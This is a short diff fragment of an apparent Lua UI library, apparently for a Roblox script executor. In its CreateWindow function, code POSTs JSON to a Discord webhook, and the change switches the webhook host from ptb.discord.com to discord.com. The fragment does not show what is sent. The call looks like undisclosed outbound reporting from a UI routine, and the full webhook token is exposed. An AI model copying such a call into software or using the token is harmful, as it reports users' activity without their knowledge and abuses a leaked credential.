@@ -2759,7 +2759,7 @@ function Library:CreateWindow(...)
                 )
             }
             (syn and syn.request or http_request or http.request) {
-                Url = "https://ptb.discord.com/api/webhooks/1115437194249769030/N_3ybNN_Td1GuncE9rwQe0LlzGC-1aiTmcnIcZBNnWKOUFAGAgTrBW4zD6SEUbwqaRfj",
+                Url = "https://discord.com/api/webhooks/1115437194249769030/N_3ybNN_Td1GuncE9rwQe0LlzGC-1aiTmcnIcZBNnWKOUFAGAgTrBW4zD6SEUbwqaRfj",
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
